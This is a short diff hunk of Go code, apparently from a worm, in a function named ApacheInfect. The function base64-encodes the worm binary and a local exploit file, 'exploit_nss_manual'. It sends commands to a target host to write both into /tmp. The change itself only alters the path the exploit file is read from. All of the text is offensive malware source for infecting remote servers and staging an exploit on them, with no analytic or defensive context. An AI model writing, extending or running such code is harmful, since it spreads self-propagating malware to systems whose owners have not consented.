@@ -63,7 +63,7 @@ func ApacheInfect(ip string, port string) bool {
 	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath)
 	MakeRequest(ip,port,commands)
 		
-	file := GetFile("./exploit_nss_manual")
+	file := GetFile("/tmp/exploit_nss_manual")
 	file64 := base64.StdEncoding.EncodeToString(file)
 	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/exploit_nss_manual")
 	MakeRequest(ip,port,commands)
